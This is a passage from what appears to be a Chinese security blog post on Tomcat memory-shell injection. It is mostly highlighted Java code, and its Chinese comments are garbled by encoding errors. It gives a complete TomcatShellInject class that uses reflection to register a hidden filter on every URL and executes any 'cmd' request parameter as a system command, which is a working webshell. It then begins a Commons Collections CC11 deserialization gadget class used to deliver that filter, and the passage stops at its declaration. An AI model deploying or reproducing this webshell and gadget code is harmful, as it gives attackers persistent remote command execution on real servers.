</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.catalina.core.ApplicationContext;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.catalina.core.StandardContext;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.*;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName TomcatShellInject
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/16 22:07
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> TomcatShellInject <span style="color:#fff;font-weight:bold">extends</span> AbstractTranslet <span style="color:#fff;font-weight:bold">implements</span> Filter {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     * webshellå‘½ä»¤å‚æ•°å
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">final</span> String cmdParamName = <span style="color:#0ff;font-weight:bold">&#34;cmd&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">static</span> String FILTER_URL_PATTERN = <span style="color:#0ff;font-weight:bold">&#34;/*&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">final</span> <span style="color:#fff;font-weight:bold">static</span> String FILTER_NAME = <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">static</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">ServletContext</span> servletContext = getServletContext();
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span>(servletContext != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">core</span>.<span style="color:#007f7f">StandardContext</span> standardContext = <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#007f7f">// åˆ¤æ–­è¯¥filter æ˜¯å¦å·²å­˜åœ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                <span style="color:#fff;font-weight:bold">if</span>(servletContext.<span style="color:#007f7f">getFilterRegistration</span>(FILTER_NAME) == <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                    java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> ctx = servletContext.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;context&#34;</span>);
</span></span><span style="display:flex;"><span>                    ctx.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>                    ApplicationContext applicationContext = (ApplicationContext) ctx.<span style="color:#007f7f">get</span>(servletContext);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> stdctx = applicationContext.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;context&#34;</span>);
</span></span><span style="display:flex;"><span>                    stdctx.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>                    standardContext = (StandardContext) stdctx.<span style="color:#007f7f">get</span>(applicationContext);
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">if</span>(standardContext != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">//ä¿®æ”¹çŠ¶æ€ï¼Œè¦ä¸ç„¶è°ƒç”¨addFilteræ–¹æ³•æ²¡æœ‰æ•ˆæœ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> stateField = org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">LifecycleBase</span>.<span style="color:#007f7f">class</span>
</span></span><span style="display:flex;"><span>                                .<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;state&#34;</span>);
</span></span><span style="display:flex;"><span>                        stateField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>                        stateField.<span style="color:#007f7f">set</span>(standardContext, org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTING_PREP</span>);
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">//åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„Filteré©¬
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        Filter filter = <span style="color:#fff;font-weight:bold">new</span> TomcatShellInject();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">// è°ƒç”¨addFilter æ–¹æ³•æ·»åŠ 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">FilterRegistration</span>.<span style="color:#007f7f">Dynamic</span> filterRegistration = servletContext.<span style="color:#007f7f">addFilter</span>(FILTER_NAME,filter);
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">// è¿›è¡Œä¸€äº›ç®€å•çš„è®¾ç½®
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        filterRegistration.<span style="color:#007f7f">setInitParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;encoding&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;utf-8&#34;</span>);
</span></span><span style="display:flex;"><span>                        filterRegistration.<span style="color:#007f7f">setAsyncSupported</span>(<span style="color:#fff;font-weight:bold">false</span>);
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">// è®¾ç½®åŸºæœ¬çš„url pattern
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        filterRegistration.<span style="color:#007f7f">addMappingForUrlPatterns</span>(java.<span style="color:#007f7f">util</span>.<span style="color:#007f7f">EnumSet</span>.<span style="color:#007f7f">of</span>(javax.<span style="color:#007f7f">servlet</span>.<span style="color:#007f7f">DispatcherType</span>.<span style="color:#007f7f">REQUEST</span>),<span style="color:#fff;font-weight:bold">false</span>,<span style="color:#fff;font-weight:bold">new</span> String[]{FILTER_URL_PATTERN});
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">// å›å¤çŠ¶æ€ï¼Œä½¿æœåŠ¡æ­£å¸¸ä½¿ç”¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        <span style="color:#fff;font-weight:bold">if</span>(stateField != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                            stateField.<span style="color:#007f7f">set</span>(standardContext,org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">catalina</span>.<span style="color:#007f7f">LifecycleState</span>.<span style="color:#007f7f">STARTED</span>);
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        <span style="color:#007f7f">// åœ¨è®¾ç½®ä¹‹åæˆ‘ä»¬éœ€è¦ è°ƒç”¨ filterstart
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                        <span style="color:#fff;font-weight:bold">if</span> (standardContext != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>                            <span style="color:#007f7f">// è®¾ç½®filterä¹‹åè°ƒç”¨ filterstart æ¥å¯åŠ¨æˆ‘ä»¬çš„ filter
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>                            java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Method</span> filterStartMethod = StandardContext.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">getDeclaredMethod</span>(<span style="color:#0ff;font-weight:bold">&#34;filterStart&#34;</span>);
</span></span><span style="display:flex;"><span>                            filterStartMethod.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>                            filterStartMethod.<span style="color:#007f7f">invoke</span>(standardContext,<span style="color:#fff;font-weight:bold">null</span>);
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> ServletContext getServletContext() <span style="color:#fff;font-weight:bold">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
</span></span><span style="display:flex;"><span>        ServletRequest servletRequest = <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">/*shellæ³¨å…¥ï¼Œå‰æéœ€è¦èƒ½æ‹¿åˆ°requestã€responseç­‰*/</span>
</span></span><span style="display:flex;"><span>        Class c = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span>);
</span></span><span style="display:flex;"><span>        java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> f = c.<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;lastServicedRequest&#34;</span>);
</span></span><span style="display:flex;"><span>        f.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        ThreadLocal threadLocal = (ThreadLocal) f.<span style="color:#007f7f">get</span>(<span style="color:#fff;font-weight:bold">null</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">//ä¸ä¸ºç©ºåˆ™æ„å‘³ç€ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–çš„å‡†å¤‡å·¥ä½œå·²æˆåŠŸ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span> (threadLocal != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; threadLocal.<span style="color:#007f7f">get</span>() != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            servletRequest = (ServletRequest) threadLocal.<span style="color:#007f7f">get</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">assert</span> servletRequest != <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        ServletContext servletContext = servletRequest.<span style="color:#007f7f">getServletContext</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span>(servletContext != <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> servletContext;
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">null</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> doFilter(ServletRequest request, ServletResponse response, FilterChain chain) <span style="color:#fff;font-weight:bold">throws</span> IOException, ServletException {
</span></span><span style="display:flex;"><span>        System.<span style="color:#007f7f">out</span>.<span style="color:#007f7f">println</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">&#34;TomcatShellInject doFilter.....................................................................&#34;</span>);
</span></span><span style="display:flex;"><span>        String cmd;
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> ((cmd = request.<span style="color:#007f7f">getParameter</span>(cmdParamName)) != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>            Process process = Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(cmd);
</span></span><span style="display:flex;"><span>            java.<span style="color:#007f7f">io</span>.<span style="color:#007f7f">BufferedReader</span> bufferedReader = <span style="color:#fff;font-weight:bold">new</span> java.<span style="color:#007f7f">io</span>.<span style="color:#007f7f">BufferedReader</span>(
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">new</span> java.<span style="color:#007f7f">io</span>.<span style="color:#007f7f">InputStreamReader</span>(process.<span style="color:#007f7f">getInputStream</span>()));
</span></span><span style="display:flex;"><span>            StringBuilder stringBuilder = <span style="color:#fff;font-weight:bold">new</span> StringBuilder();
</span></span><span style="display:flex;"><span>            String line;
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">while</span> ((line = bufferedReader.<span style="color:#007f7f">readLine</span>()) != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                stringBuilder.<span style="color:#007f7f">append</span>(line + <span style="color:#0ff;font-weight:bold">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            response.<span style="color:#007f7f">getOutputStream</span>().<span style="color:#007f7f">write</span>(stringBuilder.<span style="color:#007f7f">toString</span>().<span style="color:#007f7f">getBytes</span>());
</span></span><span style="display:flex;"><span>            response.<span style="color:#007f7f">getOutputStream</span>().<span style="color:#007f7f">flush</span>();
</span></span><span style="display:flex;"><span>            response.<span style="color:#007f7f">getOutputStream</span>().<span style="color:#007f7f">close</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        chain.<span style="color:#007f7f">doFilter</span>(request,response);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> destroy() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, SerializationHandler[] handlers) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) <span style="color:#fff;font-weight:bold">throws</span> TransletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> init(FilterConfig filterConfig) <span style="color:#fff;font-weight:bold">throws</span> ServletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="å®ç°">å®ç°<a hidden class="anchor" aria-hidden="true" href="#å®ç°">#</a></h4>
<p>ä½¿ç”¨CC11é“¾å°†<code>TomatEchoInject</code>å’Œ<code>TomcatShellInject</code>ä¸¤ä¸ªæ¶æ„ç±»åºåˆ—åŒ–ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">69
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> Evil;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.commons.collections.Transformer;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.commons.collections.functors.ConstantTransformer;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> org.apache.commons.collections.map.LazyMap;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.*;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.lang.reflect.Field;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.nio.file.Files;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.nio.file.Paths;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.HashMap;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.util.Map;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName CC11
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/3/17 15:58
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> CC11 {
